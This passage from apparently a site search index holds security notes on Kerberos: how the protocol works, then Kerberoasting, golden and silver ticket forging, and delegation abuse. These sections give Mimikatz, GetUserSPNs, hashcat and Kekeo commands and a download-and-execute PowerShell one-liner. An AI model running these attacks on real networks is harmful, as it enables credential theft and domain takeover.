KDC including the signature of PAC, and verify if it is correct. (not part of Kerberos, but NRPC) Protocol Flow Ref: https://scriptdotsh.com/wp-content/uploads/2018/10/trust2.png Source: https://www.varonis.com/blog/kerberos-authentication-explained/ Ref: https://www.youtube.com/watch?v=VpBCJ8vS7T0 Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf Client - KDC (Pre-Auth) (Kerberos 5+) Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf Client constructs an authenticator (request for TGT) containing: Identify information - unencrypted. Timestamp - encrypted using user's password (hash). User's password (hash) is used as symmetric key. When a client sends a request ( AS-REQ ) for a ticket to the Key Distribution Center (KDC) . A timestamp is sent encrypted with user's password hash (also called user's long term key ). [When using SmartCard] [non-DH] Timestamp is signed using public-key and public-key is sent to DC [DH] Timestamp is signed using public-key and public-key and DH parameters are sent to DC If request can be decrypted with user's password hash, And If request's time is within 5 minutes: The KDC creates a Ticket-Granting Ticket (TGT) for the client Special ticket that permits the client to obtain additional Kerberos tickets within the same Kerberos realm. Usually good for 10 hours. Containing: client name IP address timestamp validity period - 10 hours max by default Sends ( AS-REP ) the encrypted TGT + TGS Session Key back to the client User portion (client can decrypt) - Encrypted with user's password (hash), contains: TGS Session Key - Usable to encrypt communication between client and TGS [When using SmartCard] - [non-DH] Encrypted with public-key - [DH] Encrypted with DH info (?) not public-key Server portion (client cannot decrypt) - Encrypted with KDC's secret key ( Domain key / krbtgt account ), contains: TGT - Permits the client to obtain additional tickets (like TGS) which gives permission for specific services. Contains: [Microsoft] Privilege Attribute Certificate (PAC) containing: Username User's RID Group membership PAC is signed with: Target key (for TGT target key is also KDC key) KDC key If TGS Session Key can be decrypted using user's password (hash): Client stores encrypted TGT and decrypted (?) TGS Session Key in Kerberos Tray Always lives in memory Never saved into disk Kerberos Tray can be explored with kerbtray Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf Client - Service Authentication TGS - Ticket granting service is a KDC component that issues a service ticket when a client requests connection to a Kerberos service. Client sends following to TGS ( TGS-REQ ) Copy of TGT TGS can decrypt this using KDC's secret key Name of the service Time stamped client ID encrypted with TGS Session Key TGS can decrypt this using user's password (hash) TGS will return ( TGS-REP ): User Portion (User can decrypt) - Encrypted with TGS Session Key Service Session Key Validity time Server Portion / Service Ticket (User cannot decrypt) - Encrypted with service secret key Privilege Attribute Certificate (PAC) 2 HMAC signatures: Target key - Service account's hash (might be crackable) KDC Key - Krbtgt account's hash (not easily crackable) Service Session Key User details TGS will not do a permission validation. If user has a valid TGT that is all it takes to obtain a TGS. Validating if the user has access to the service is up to the service. Service Session Key and Service Ticket is stored in Kerberos Tray (?) Client send the following to service when necessary: Encrypted Service Ticket Time stamped authenticator encrypted with the Service Session Key Service will: Decrypt the Service Ticket with its secret and validate both HMAC Validate timestamped authenticator. If both are fine, decrypted Service Ticket and check Privilege Attribute Certificate (PAC) to decide if access should be granted. 2 HMAC signatures during PAC Validation : Target key - Service account's hash (might be crackable) Always verified KDC key - Krbtgt account's hash (not easily crackable) Verified with KDC \"sometimes\" (since data should be sent to KDC for verification) Windows send PAC Validation message to NetLogin service of DC if: TCB (act as part of the OS) privilege is not there and it is not a Service Control Manager (SCM) account. :. generally if application is running as a service in local system, hash is not checked: SQL Server, Exchange server: Generally does not check App pools in web servers: Always check Can be asked to check always using regkey \"ValidateKdcPacSignature\" Service may: Send a response with timestamp encrypted with the Service Session Key Client decrypt and verify to prevent MitM Inter-forest Authentication Instead of encrypting with Domain1\u2019s krbtgt account, a ticket is encrypted/signed with the inter-realm trust key that the domains previously exchanged, which is called as an \u201c Inter-realm ticket-granting-ticket/TGT. \u201d Then Domain2 verifies the TGT included in the referral, decrypts it with the previously negotiated inter-realm trust key and proceeds further. An inter-realm TGT can be forged. Other Services (Microsoft Implementation) When a domain account is configured to run a service (ex: MS SQL) in the environment, a Service Principal Name (SPN) is used in the domain to associate the service with a login account . krbtgt password Changes with domain functional level update (ex: NT5 - NT6) Recovery from restore media Manually changed (compromise recovery) Formats Encoded in ASN . 1 Kerberos Tickets are in KRB - CRED format: RFC4120 Microsoft Specific PAC format: cc237917 Attack Patterns Kerberos brute-force Automated continued attempts to guess a password ASREPRoast Kerberoast TGS has server position encrypted using service account password hash. User can use the TGT to request TGS for any service (no authorization check) Use this to crack the service account password offline. Service account are sometimes ignored and may have privileged access. Hash could be used to create Silver Tickets Tim Medin DebyCon 2014 Find Service Accounts: GetUserSPNs Powerview: Get - NetUser - SPN AD nodule: Get - ADUser - Filter { ServicePrincipalName - ne $null } - Properties ServicePrincipalName Request Ticket (TGS): Add - Type - AssemblyName System . IdentityModel New - Object System . IdentityModel . Tokens . KerberosRequestorSecurityToken - ArgumentList ServicePrincipalName from above commands PowerView: Request - SPNTicket klist to verify the ticket Store to disk using: Invoke - Mimikatz - Command kerberos::list /export Crack: . \\ tgsrepcrack . py . \\ passwords . txt file.kirbi Note: If full control of user is there, can force-set an SPN on the user and then bruteforce. References https://pentestlab.blog/2018/06/12/kerberoast/ Quick Reference** The process of cracking Kerberos service tickets and rewriting them in order to gain access to the targeted service. Doesn\u2019t require any interaction with the service as legitimate active directory access can be used to request and export the service ticket which can be cracked offline in order to retrieve the plain-text password of the service because service tickets are encrypted with the hash (NTLM) of the service account so any domain user can dump hashes from services without the need to get a shell into the system that is running the service. Any domain user has the rights by default on a standard domain to: To request a Service Ticket for any service. Permission checks are done later at the service. Request a copy of the service accounts . Request correlating password hash relevant to service accounts (?) Crackable and important tickets can be identified by considering: SPNs bind to domain user accounts Password last set Password expiration Last logon Tips Look for SQL Server instances with domain admin used as the service account This is not recommended Instead, each service should use separate user accounts SMB by default use a computer account Exchange server defaults to user account Step 1 - Service Provider Name (SPN) and SPN Discovery Format: ServiceType / Host [ :Port ][ /DistinguishedName ] [ ServiceAccountName ] Users system doesn't know the account running the service But KDC needs this info, so that Service Ticket can be encrypted using that account's hash SPN is the name by which a Kerberos client uniquely identifies an instance of a service for a given Kerberos target computer KDC has a mapping between [\"Service\" to \"Account\"] A given service instance can have multiple SPNs if there are multiple names that clients might use for authentication. SPN always includes the name of the host computer A SPN is registered for each host alias Point users to the appropriate resource for connection Discovery via LDAP queries Help in identify hosts that are running important services Look for services associated with \"User\" accounts (can be easier to crack, compared to \"Computer\" accounts) - GetUserSPNs List of SPNs: https://adsecurity.org/?page_id=183 References: Microsoft - Service Principal Names (SPN): SetSPN Syntax Tools SetSPN - Can, view, edit, and delete SPN registrations. Register setspn - s ServiceClass / Host : Port AccountName setspn - s FIMService / FIMSVR . contoso . com CONTOSO \\ FIMService (-s verify that there are no duplicates) setspn - s http / CES1 . corp . contoso . com CORP \\ CES View all the mappings: setspn - L hostname (?) setspn - T pentestlab - Q * /* Delete: setspn - d ServiceClass / Host : Port AccountName Reset SPN registrations for account: setspn - r AccountName Re-register all SPNs for a given host: setspn - R hostname Discover missing SPNs: DCDIAG / s : ServerName / c / v Write back computer account's AD replication SPN: DCDIAG / fix Restart NTDS: net stop ntds net start ntds Check DC security errors (duplicate SPNs, etc): DCDIAG / test : checksecurityerror GetUserSPNs - Query the active directory to discover only services that are associated with a user account Part of: https://github.com/nidem/kerberoast powershell_import / root / Desktop / GetUserSPNs . ps1 cscript . exe GetUserSPNs . vbs PowerShell AD Recon Part of: https://github.com/PyroTek3/PowerShell-AD-Recon Query the Active Directory for interesting services such as Exchange, Microsoft SQL, Terminal etc powershell_import / root / Discover-PSMSSQLServers . ps1 powershell_execute Discover-PSMSSQLServers powershell_import / root / Discover-PSMSExchangeServers . ps1 powershell_execute Discover-PSMSExchangeServers Find service accounts: powershell_import / root / Find-PSServiceAccounts . ps1 powershell_execute Find-PSServiceAccounts Empire: usemodule situational_awareness / network / get_spn PowerShellery Part of: https://github.com/nullbind/Powershellery Get-SPN -type service -search * -List yes | Format-Table Get-SPN -type service -search * Get UserSID, the service and the actual User. Import-Module .\\ Get-DomainSpn . psm1 Get-DomainSpn Impacket Valid domain credentials are required for communication with the Active Directory as token based authentication cannot be used. ./ GetUserSPNs . py -dc-ip 10 . 0 . 0 . 1 pentestlab . local / test Step 2 - Request Service Tickets Request is sent to the KDC , hence it's not required that service is accessible, available or even exit anymore. Request the service ticket for a specific SPN: Add-Type -AssemblyName System . IdentityModel New-Object System . IdentityModel . Tokens . KerberosRequestorSecurityToken -ArgumentList PENTESTLAB_001/WIN-PTELU2U07KG.PENTESTLAB.LOCAL:80 Alternatively, use Mimikatz by specifing target as the service principal name: kerberos :: ask / target : PENTESTLAB_001 / WIN - PTELU2U07KG . PENTESTLAB . LOCAL : 80 List all available cached tickets: klist Invoke-Mimikatz -Command kerberos::list load kiwi kerberos_ticket_list kiwi_cmd kerberos :: list Request Kerberos service tickets that belong to domain users only which should be easier to cracked compared to computer accounts service tickets (requires valid domain credentials in order to interact with the Active Directory since it will executed from a system that is not part of a domain): ./ GetUserSPNs . py -request pentestlab . local / test Automatically identify weak service tickets based on user account and password expiry (RiskySPN: https://github.com/cyberark/RiskySPN ): Find-PotentiallyCrackableAccounts -FullData -Verbose All user accounts that have an associated SPN: Find-PotentiallyCrackableAccounts -Domain pentestlab.local Export to CVS (offline cracking): Export-PotentiallyCrackableAccounts Get service tickets for service instance by its SPN: Get-TGSCipher -SPN PENTESTLAB_001/WIN-PTELU2U07KG.PENTESTLAB.LOCAL:80 Various functions that can be executed to request, list and export service tickets: Auto-Kerberoast List-UserSPNs List-UserSPNs -Domain pentestlab.local Mass request tickets (ticket for each account) Add-Type -AssemblyName System . IdentityModel setspn . exe -T lab . local -Q */- | Select-String ^CN -Content 0 , 1 | % { New-Object System . IdentityModel . Tokens . KerberosRequestorSecurityToken -ArgumentList $_ . Context . PostContext [ 0 ]. Trim () } ./ GetUserSPNs . ps1 | % { New-Object System . IdentityModel . Tokens . KerberosRequestorSecurityToken -ArgumentList $_ . ServicePrincipalName } Step 3 - Export Service Tickets List all available tickets from memory and save in remote host: Invoke-Mimikatz -Command kerberos::list /export PowerShell Empire: usemodule credentials / mimikatz / extract_tickets standard :: base64 kerberos :: list / export Extract Ticket hashes for services that support Kerberos authentication: usemodule credentials / invoke_kerberoast AutoKerberoast will request and extract all the service tickets in base64 format. Invoke-AutoKerberoast Invoke-AutoKerberoast -GroupName Domain Admins -Domain pentestlab . local -HashForm Extract hashed in different formats (John, Hashcat and Kerberoast) - eliminates the need of Mimikatz for ticket export Get-TGSCipher -SPN PENTESTLAB_001/WIN-PTELU2U07KG.PENTESTLAB.LOCAL:80 -Format John Extract TGT responses from PCAP: extracttgsrepfrompcap . py Step 4 - Crack Service Tickets Crack ticket: python tgsrepcrack . py / root / Desktop / passwords . txt PENTESTLAB_001 . kirbi Extract the Hash from Service Ticket python extractServiceTicketParts . py PENTESTLAB_001 . kirbi tgscrack . exe - hashfile hash . txt - wordlist passwords . txt If PowerShell remoting is enabled then the password that has been retrieved from the service ticket can be used for execution of remote commands and for other lateral movement operations. Enable-PSRemoting $pass = Password123 | ConvertTo-SecureString -AsPlainText -Force $creds = New-Object System . Management . Automation . PSCredential -ArgumentList PENTESTLAB_001 , $pass Invoke-Command -ScriptBlock { get-process } -ComputerName WIN-PTELU2U07KG . PENTESTLAB . LOCAL -Credential $creds Dump returned service account with its correlating password hash: powershell -ep bypass -c IEX (New-Object System.Net.WebClient).DownloadString( https://raw.githubusercontent.com/nettitude/PoshC2/master/Modules/powerview.ps1 Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash1.txt hashcat64 . exe -m 13100 C:\\Hash1.txt C : \\ Rocktastic12a - -outfile = C:\\OutputHash1.txt ` Step 5 - Rewrite Service Tickets RAM Injection Kerberos tickets are signed with the NTLM hash of the password. If the ticket hash has been cracked then it is possible to rewrite the ticket with Kerberoast python script. Allow: Impersonate any domain user when the service is going to be accessed. Privilege escalation is also possible as the user can be added into an elevated group such as Domain Admins. python kerberoast . py -p Password123 -r PENTESTLAB_001 . kirbi -w PENTESTLAB . kirbi -u 500 python kerberoast . py -p Password123 -r PENTESTLAB_001 . kirbi -w PENTESTLAB . kirbi -g 512 Also fake account. Use Mimikatz to generate ticket (change RID of the account to 1106): kerberos :: golden / domain : lab . local / sid : sid / groups : 123 , 124 , 125 / target : target . local / service : MSSQLSvc / ticket : target . local . kirbi / rc4 : service s hash / ppt / id : 1106 / user : tm / ppt will directly inject the fake account into memory. / id and / user can be invalid values, so that logs will be useless / groups can be altered to add user to domain-admin The new ticket can be injected back into the memory with kerberos :: ptt PENTESTLAB . kirbi Defense Use *- ADServiceAccount cmdlet to create service accounts Pick really random, good passwords (25+ chars ) Monitor DC for bursts of Service Ticket requests (Event ID 4769) Force services to verify PAC - Doesn't prevent cracking - Prevent writing - Can impact performance Pass the key Pass the ticket The process of forging a session key and presenting that forgery to the resource as credentials Silver Ticket Silver Ticket: A forged ticket that grants access to a serviceCredential stuffing. Password hashes of service accounts could be used to create Kerberos session ticket (TGS) has a sever portion which is encrypted with the password hash of the service account. Can request a ticket and do offline brute forcing. https://drive.google.com/open?id=1iSXKVgkO_U61MCf0ItaZgyMt-406pWdD KDC does not handle authorization Can request TGS for any service TGS is encrypted using target-service NTLM hash .:. it is possible to brute-force the TGS to get target-service account credentials Find Service Accounts GetUserSPNs - https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py PowerView (SPN = Service Principal Name) Get-Netuser -SPN ActiveDirectory Module Install-ActiveDirectoryModule -DllPath C : \\ AdModule \\ Microsoft . ActiveDirectory . Management . dll ADModulePath C : \\ AdModule \\ ActiveDirectory . psd1 Get-ADUser -Filter { ServicePrincipalName -ne $null } -Properties ServicePrincipalName Request SPN Ticket Add-Type -AssemblyName System . IdentityModel New-Object System . IdentityModel . Tokens . KerberosRequestorSecurityToken -ArgumentList server-name - PowerView Request-SPNTicket Save Tieket List all tickets in cache (check if granted): klist Mimikatz: Invoke - Mimikatz - Command kerberos::list /export Bruteforce tgsrepcrack or use John python . exe . \\ tgsrepcrack . py . \\ password . txt ticket Golden Ticket Golden Ticket: A ticket that grants a user domain admin access Ticket not made by KDC (ticket is self-made) Not limited by GPO Smart-card independent Hence, it's possible to push anything Since we have krbtgt Can modify PAC Group ID, SID, Username Kerberos is stateless All account policy is client side enforcement Disabled / Expiry / Logon hours Silo memberships Protected Users and other group memberships With Kerberos 5 - TGS / KDC has no way of validating that account is still valid when presented with TGT. Microsoft implement: If TGT is older than 20 mins the TGS will validate the account with KDC when issuing a service ticket. Account validity and check enabled state is checked. However, with Golden Ticket we issuer our own TGT. Therefore, it is possible to issue TGT with recent issued-times to bypass this check. Why attack on TGT, but not on TGS? Service account passwords are rotated every 30-40 days. Krbtgt account password is never changed. A singled TGT can get many TGS. Ticket Encryption PAC KDC Signature PAC Server Signature TGT krbtgt krbtgt krbtgt TGS target krbtgt target Generating \"Golden Ticket\" requires: KDC key (krbtgt) SID of the domain (whom, psgetsid) Domain name lsadump :: lsa / inject / name : krbtgt kerberos :: golden / domain : domain / sid : domain - sid / rc4 : ntlm - hash - of - krbtgt / user : Administrator / id : 500 - RID of the user ( 500 is domain admin ) / groups : 513 , 512 , 520 , 518 , 519 / ticket : Administrator.kirbi - ticket filename Encryption downgrade with Skeleton Key Malware A malware that can bypass Kerberos, but the attack must have Admin access DCShadow attack A new attack where attackers gain enough access inside a network to set up their own DC to use in further infiltration Smart Card Authentication with DH Keys If certificate based authentication is required DH must be implemented (as per spec) RFC 4556 RFC 5349 Microsoft improved current protocol with draft: https://tools.ietf.org/html/draft-ietf-kitten-pkinit-freshness-07 https://datatracker.ietf.org/meeting/91/session/kitten https://datatracker.ietf.org/meeting/91/materials/slides-91-kitten-1.pdf In order for GPO to work full network should be aware of it ( Windows 10 2016) Detect using IPS rule to inspect AS - RE Q ( AS - REQ is now signed, not encrypted) Attacking Windows PKI Mimikatz can export Windows CA (NTAuth certificate store ) Ask PKI server to generate a raw certificate (with any required expiry and any required user) without CRLDP so that cert cannot be revoked. Kerberos Delegation Allows reusing the end-user credentials to access resources hosted on a different server. Used when Kerberos Double Hop is required. Impersonating the incoming/authentication user is necessary to work. Types: Unconstrained (only Windows Server 2003 ) - Allow authentication to any service in the domain Constrained Unconstrained Kerberos Delegation - https://drive.google.com/open?id=1VZvQcin4RN7PkByplk-LhI1P3mrCoJXY User provide credentials to DC DC returns TGT User request TGS for web service DC provides TGS (TGS contains user's TGT) User sends TGT and TGS to web Server Same as usual up to this point Web server service account use user's TGT to request a TGS got database server from DC - Web server service account can decrypt TGS and extract the user's TGT - This is because TGS is encryoted with web server service account's NTLM hash Web server service account connects to database impersonating the user When allowed to a paticular service-account, allows delegation to any service in domain by impercenating incoming user because DC place user's TGT in TGS (step 4) In example: web server service account can request access to any service in domain as user connecting to it Usable to escalate privilages (if webserver can be comprimzed) When a domian admin / high privilaged user connect to machine (Ex: webserver) Identifying Nodes with Unconstrained Delegation Enabled Get - NetComputer - UnConstrained Get - ADComputer - Filter { TrustedForDelegation - eq $ True } Get - ADUser - Filter { TrustedForDelegation - eq $ True } Attack Pattern Compromise the server that use unconstrained delegation Wait for a high privileged connect Once connected, export all the tickets including TGT for that User Invoke - Mimikatz - Command sekurlsa::tickets /export Reuse tickets with Invoke - Mimikatz - Command kerberos::ppt C:\\tickets\\admin.kirbi Constrained Kerberos Delegation Only provide access to specified services on a specifiv computer Service account must have TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION - T2A4D UserAccountControl attribute Service account can asccess all services specified in msDS - AllowedToDelegateTo attribute Abuse possibllities: Student authenticate using non-kerberos auth and Protocol Transition is used by Kerberos to support SSO Delegation occurs ont only got specifid service but for any service running under the same account No validation for the specific SPN https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/ Delegation is not restricted by SPN. It's possible to create alternate tickets. Identifying Users with Unconstrained Delegation Enabled Get-DomainUser -TrustedToAuth Get-DomainComputer -TrustedToAuth Install-ActiveDirectoryModule -DllPath C : \\ AdModule \\ Microsoft . ActiveDirectory . Management . dll ADModulePath C : \\ AdModule \\ ActiveDirectory . psd1 Get-ADObject -Filter { msDS-AllowedToDelegateTo -ne $null } -Properties msDS-AllowedToDelegateTo Get cleartext password or NTLM hash of the service account. Use the above, with Kekeo to get TGT asktgt . exe / user : exadmin / domain : example . powershell . local / key : deadbeefdeadbeefdeadbeef / ticket : exadmin . kirbi Use TGT to get TGS: Retquest a TGS as the user / user : Administrator \\ s4u . exe / tgt : axadmin . kribi / user : Administrator @example . powershell . local / service : cifs / example1 . powershell . local Use TGT Invoke - Mimikatz - Command kerberos:ppt example.kribi ls \\\\ example . powershell . local \\ c $ Tools A little toolbox to play with Microsoft Kerberos in C: https://github.com/gentilkiwi/kekeo/ C# toolset for raw Kerberos interaction and abuses: https://github.com/GhostPack/Rubeus References https://docs.microsoft.com/en-us/windows/desktop/secauthn/authentication-portal https://docs.microsoft.com/en-us/windows/desktop/secauthn/microsoft-kerberos https://drive.google.com/open?id=1eaQki6QuqfbHqMfkaKH66z2OAnI0lV0H Tim Medin - Attacking Kerberos: Kicking the Guard Dog of Hades New References Kerberos Attacks 101: https://www.youtube.com/watch?v=IBeUz7zMN24 feature=youtu.be Attacking Microsoft Kerberos Kicking the Guard Dog of Hades Tim Medin https://blog.redforce.io/oh-my-kerberos-do-not-get-kerberoasted/ https://www.tarlogic.com/en/blog/how-kerberos-works/ https://www.tarlogic.com/en/blog/how-to-attack-kerberos/","title":"IAM - Kerberos"},{"location":"iam-kerberos/#iam-kerberos","text":"","title":"IAM - Kerberos"},{"location":"iam-kerberos/#protocol-summary","text":"Designed to lessening authentication related packets transmitted in the network Not designed for today's network security Loosing KDC means, security is at total loss Kerberos uses either UDP / 88 or TCP / 88 as transport protocol. Hence Kerberos itself is responsible of encrypting data. Several agents working together: Client or user: who wants to access to the service. AP ( Application Server ) : offers the service required by the user. KDC ( Key Distribution Center ) : main service of Kerberos, responsible of issuing the tickets, installed on the DC (Domain Controller). It is supported by the AS ( Authentication Service ) , which issues the TGTs . Keys: KDC key or krbtgt key : Derivate from krbtgt account NTLM hash. User key : Derivate from user NTLM hash. Service key : Derivate from the NTLM hash of service owner, which can be an user or computer account. Session key : Negotiated between the user and KDC. Service session key : to be use between user and service. Tickets: TGS ( Ticket Granting Service ) : Ticket which user can use to authenticate against a service. It is encrypted with the service key. TGT ( Ticket Granting Ticket ) : Ticket presented to the KDC to request for TGSs. It is encrypted with the KDC key. PAC ( Privilege Attribute Certificate ) is an structure included in almost every ticket. It is possible to services to verify the PAC by communicating with the KDC Messages: KRB_AS_REQ : Used to request the TGT to KDC. KRB_AS_REP : Used to deliver the TGT by KDC. KRB_TGS_REQ : Used to request the TGS to KDC, using the TGT. KRB_TGS_REP : Used to deliver the TGS by KDC. KRB_AP_REQ : Used to authenticate a user against a service, using the TGS. KRB_AP_REP : (Optional) Used by service to identify itself against the user. KRB_ERROR : Message to communicate error conditions. KERB_VERIFY_PAC_REQUEST : AP send message to KDC including the signature of PAC, and verify if it is correct. (not part of Kerberos, but NRPC)","title":"Protocol Summary"},{"location":"iam-kerberos/#protocol-flow","text":"Ref: https://scriptdotsh.com/wp-content/uploads/2018/10/trust2.png Source: https://www.varonis.com/blog/kerberos-authentication-explained/ Ref: https://www.youtube.com/watch?v=VpBCJ8vS7T0 Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf","title":"Protocol Flow"},{"location":"iam-kerberos/#client-kdc-pre-auth-kerberos-5","text":"Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf Client constructs an authenticator (request for TGT) containing: Identify information - unencrypted. Timestamp - encrypted using user's password (hash). User's password (hash) is used as symmetric key. When a client sends a request ( AS-REQ ) for a ticket to the Key Distribution Center (KDC) . A timestamp is sent encrypted with user's password hash (also called user's long term key ). [When using SmartCard] [non-DH] Timestamp is signed using public-key and public-key is sent to DC [DH] Timestamp is signed using public-key and public-key and DH parameters are sent to DC If request can be decrypted with user's password hash, And If request's time is within 5 minutes: The KDC creates a Ticket-Granting Ticket (TGT) for the client Special ticket that permits the client to obtain additional Kerberos tickets within the same Kerberos realm. Usually good for 10 hours. Containing: client name IP address timestamp validity period - 10 hours max by default Sends ( AS-REP ) the encrypted TGT + TGS Session Key back to the client User portion (client can decrypt) - Encrypted with user's password (hash), contains: TGS Session Key - Usable to encrypt communication between client and TGS [When using SmartCard] - [non-DH] Encrypted with public-key - [DH] Encrypted with DH info (?) not public-key Server portion (client cannot decrypt) - Encrypted with KDC's secret key ( Domain key / krbtgt account ), contains: TGT - Permits the client to obtain additional tickets (like TGS) which gives permission for specific services. Contains: [Microsoft] Privilege Attribute Certificate (PAC) containing: Username User's RID Group membership PAC is signed with: Target key (for TGT target key is also KDC key) KDC key If TGS Session Key can be decrypted using user's password (hash): Client stores encrypted TGT and decrypted (?) TGS Session Key in Kerberos Tray Always lives in memory Never saved into disk Kerberos Tray can be explored with kerbtray Ref: https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf","title":"Client - KDC (Pre-Auth) (Kerberos 5+)"},{"location":"iam-kerberos/#client-service-authentication","text":"TGS - Ticket granting service is a KDC component that issues a service ticket when a client requests connection to a Kerberos service. Client sends following to TGS ( TGS-REQ ) Copy of TGT TGS can decrypt this using KDC's secret key Name of the service Time stamped client ID encrypted with TGS Session Key TGS can decrypt this using user's password (hash) TGS will return ( TGS-REP ): User Portion (User can decrypt) - Encrypted with TGS Session Key Service Session Key Validity time Server Portion / Service Ticket (User cannot decrypt) - Encrypted with service secret key Privilege Attribute Certificate (PAC) 2 HMAC signatures: Target key - Service account's hash (might be crackable) KDC Key - Krbtgt account's hash (not easily crackable) Service Session Key User details TGS will not do a permission validation. If user has a valid TGT that is all it takes to obtain a TGS. Validating if the user has access to the service is up to the service. Service Session Key and Service Ticket is stored in Kerberos Tray (?) Client send the following to service when necessary: Encrypted Service Ticket Time stamped authenticator encrypted with the Service Session Key Service will: Decrypt the Service Ticket with its secret and validate both HMAC Validate timestamped authenticator. If both are fine, decrypted Service Ticket and check Privilege Attribute Certificate (PAC) to decide if access should be granted. 2 HMAC signatures during PAC Validation : Target key - Service account's hash (might be crackable) Always verified KDC key - Krbtgt account's hash (not easily crackable) Verified with KDC \"sometimes\" (since data should be sent to KDC for verification) Windows send PAC Validation message to NetLogin service of DC if: TCB (act as part of the OS) privilege is not there and it is not a Service Control Manager (SCM) account. :. generally if application is running as a service in local system, hash is not checked: SQL Server, Exchange server: Generally does not check App pools in web servers: Always check Can be asked to check always using regkey \"ValidateKdcPacSignature\" Service may: Send a response with timestamp encrypted with the Service Session Key Client decrypt and verify to prevent MitM","title":"Client - Service Authentication"},{"location":"iam-kerberos/#inter-forest-authentication","text":"Instead of encrypting with Domain1\u2019s krbtgt account, a ticket is encrypted/signed with the inter-realm trust key that the domains previously exchanged, which is called as an \u201c Inter-realm ticket-granting-ticket/TGT. \u201d Then Domain2 verifies the TGT included in the referral, decrypts it with the previously negotiated inter-realm trust key and proceeds further. An inter-realm TGT can be forged.","title":"Inter-forest Authentication"},{"location":"iam-kerberos/#other","text":"Services (Microsoft Implementation) When a domain account is configured to run a service (ex: MS SQL) in the environment, a Service Principal Name (SPN) is used in the domain to associate the service with a login account . krbtgt password Changes with domain functional level update (ex: NT5 - NT6) Recovery from restore media Manually changed (compromise recovery) Formats Encoded in ASN . 1 Kerberos Tickets are in KRB - CRED format: RFC4120 Microsoft Specific PAC format: cc237917","title":"Other"},{"location":"iam-kerberos/#attack-patterns","text":"","title":"Attack Patterns"},{"location":"iam-kerberos/#kerberos-brute-force","text":"Automated continued attempts to guess a password","title":"Kerberos brute-force"},{"location":"iam-kerberos/#asreproast","text":"","title":"ASREPRoast"},{"location":"iam-kerberos/#kerberoast","text":"TGS has server position encrypted using service account password hash. User can use the TGT to request TGS for any service (no authorization check) Use this to crack the service account password offline. Service account are sometimes ignored and may have privileged access. Hash could be used to create Silver Tickets Tim Medin DebyCon 2014 Find Service Accounts: GetUserSPNs Powerview: Get - NetUser - SPN AD nodule: Get - ADUser - Filter { ServicePrincipalName - ne $null } - Properties ServicePrincipalName Request Ticket (TGS): Add - Type - AssemblyName System . IdentityModel New - Object System . IdentityModel . Tokens . KerberosRequestorSecurityToken - ArgumentList ServicePrincipalName from above commands PowerView: Request - SPNTicket klist to verify the ticket Store to disk using: Invoke - Mimikatz - Command kerberos::list /export Crack: . \\ tgsrepcrack . py . \\ passwords . txt file.kirbi Note: If full control of user is there, can force-set an SPN on the user and then bruteforce. References https://pentestlab.blog/2018/06/12/kerberoast/","title":"Kerberoast"},{"location":"iam-kerberos/#quick-reference","text":"The process of cracking Kerberos service tickets and rewriting them in order to gain access to the targeted service. Doesn\u2019t require any interaction with the service as legitimate active directory access can be used to request and export the service ticket which can be cracked offline in order to retrieve the plain-text password of the service because service tickets are encrypted with the hash (NTLM) of the service account so any domain user can dump hashes from services without the need to get a shell into the system that is running the service. Any domain user has the rights by default on a standard domain to: To request a Service Ticket for any service. Permission checks are done later at the service. Request a copy of the service accounts . Request correlating password hash relevant to service accounts (?) Crackable and important tickets can be identified by considering: SPNs bind to domain user accounts Password last set Password expiration Last logon Tips Look for SQL Server instances with domain admin used as the service account This is not recommended Instead, each service should use separate user accounts SMB by default use a computer account Exchange server defaults to user account","title":"Quick Reference**"},{"location":"iam-kerberos/#step-1-service-provider-name-spn-and-spn-discovery","text":"Format: ServiceType / Host [ :Port ][ /DistinguishedName ] [ ServiceAccountName ] Users system doesn't know the account running the service But KDC needs this info, so that Service Ticket can be encrypted using that account's hash SPN is the name by which a Kerberos client uniquely identifies an instance of a service for a given Kerberos target computer KDC has a mapping between [\"Service\" to \"Account\"] A given service instance can have multiple SPNs if there are multiple names that clients might use for authentication. SPN always includes the name of the host computer A SPN is registered for each host alias Point users to the appropriate resource for connection Discovery via LDAP queries Help in identify hosts that are running important services Look for services associated with \"User\" accounts (can be easier to crack, compared to \"Computer\" accounts) - GetUserSPNs List of SPNs: https://adsecurity.org/?page_id=183 References: Microsoft - Service Principal Names (SPN): SetSPN Syntax Tools SetSPN - Can, view, edit, and delete SPN registrations. Register setspn - s ServiceClass / Host : Port AccountName setspn - s FIMService / FIMSVR . contoso . com CONTOSO \\ FIMService (-s verify that there are no duplicates) setspn - s http / CES1 . corp . contoso . com CORP \\ CES View all the mappings: setspn - L hostname (?) setspn - T pentestlab - Q * /* Delete: setspn - d ServiceClass / Host : Port AccountName Reset SPN registrations for account: setspn - r AccountName Re-register all SPNs for a given host: setspn - R hostname Discover missing SPNs: DCDIAG / s : ServerName / c / v Write back computer account's AD replication SPN: DCDIAG / fix Restart NTDS: net stop ntds net start ntds Check DC security errors (duplicate SPNs, etc): DCDIAG / test : checksecurityerror GetUserSPNs - Query the active directory to discover only services that are associated with a user account Part of: https://github.com/nidem/kerberoast powershell_import / root / Desktop / GetUserSPNs . ps1 cscript . exe GetUserSPNs . vbs PowerShell AD Recon Part of: https://github.com/PyroTek3/PowerShell-AD-Recon Query the Active Directory for interesting services such as Exchange, Microsoft SQL, Terminal etc powershell_import / root / Discover-PSMSSQLServers . ps1 powershell_execute Discover-PSMSSQLServers powershell_import / root / Discover-PSMSExchangeServers . ps1 powershell_execute Discover-PSMSExchangeServers Find service accounts: 